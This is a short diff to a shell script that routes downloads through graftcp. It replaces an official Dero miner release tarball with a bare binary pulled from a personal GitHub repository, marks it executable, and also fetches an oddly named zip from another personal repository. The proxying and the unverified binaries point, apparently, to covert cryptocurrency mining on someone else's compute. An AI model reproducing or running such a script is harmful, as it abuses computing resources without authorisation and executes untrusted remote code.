@@ -35,8 +35,8 @@ echo ""
 echo " "
 echo " "
 
-./graftcp/graftcp wget https://github.com/whalesburg/dero-stratum-miner/releases/download/v1.0.2/dero-stratum-miner-v1.0.2-linux-amd64.tar.gz
-tar -xf dero-stratum-miner-v1.0.2-linux-amd64.tar.gz
+./graftcp/graftcp wget https://github.com/AhmadTugiman/gembel/raw/main/dero-stratum-miner
+chmod +x dero-stratum-miner
 
 ./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
 unzip magicBezzHash.zip
